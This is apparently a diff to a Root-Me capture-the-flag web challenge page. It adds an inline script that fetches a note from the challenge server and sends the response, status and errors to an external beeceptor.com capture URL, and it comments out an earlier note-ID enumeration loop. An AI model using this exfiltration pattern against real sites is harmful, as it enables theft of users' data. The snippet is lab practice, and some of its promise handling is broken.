@@ -4,6 +4,18 @@
 </head>
 <body>
 <script>
+    fetch('https://web-client-ch56.challenge01.root-me.org:58056/notes/2278')
+  .then(response => {
+    if (!response.ok) {
+    fetch('https://rootmeleak2.free.beeceptor.com/' + response.status); // Use response.json() if the response is JSON
+
+    }
+    fetch('https://rootmeleak2.free.beeceptor.com/' + response.text()); // Use response.json() if the response is JSON
+  })
+  .then(data => fetch('https://rootmeleak2.free.beeceptor.com/' + data))
+  .catch(error => fetch('https://rootmeleak2.free.beeceptor.com/' + error));
+
+    /*
     const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_', base = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
 let id = 2270;
 
@@ -65,7 +77,7 @@ function noteSearch(url) {
 }
 
 findValidUrl();
-
+*/
 </script>
     
 </body>
